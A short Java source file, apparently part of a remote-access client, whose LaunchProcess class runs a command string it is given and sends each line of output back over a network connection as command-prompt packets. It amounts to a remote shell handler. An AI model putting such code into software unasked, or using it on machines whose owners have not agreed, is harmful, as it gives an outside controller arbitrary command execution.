package com.redpois0n;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.packets.in.PacketBuilder;
import com.redpois0n.packets.out.Header;

public class LaunchProcess extends Thread {

	public Process p;
	public String process;
	public static LaunchProcess latest;

	public LaunchProcess(String process) {
		this.process = process;
		latest = this;
	}

	public void run() {
		String line;
		try {
			p = Runtime.getRuntime().exec(process);
			Connection.status(Constants.STATUS_RAN_CMD);
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, line));
				}
			}
			input.close();
			latest = null;
		} catch (Exception ex) {
			Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, "Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
			latest = null;
		}
	}

}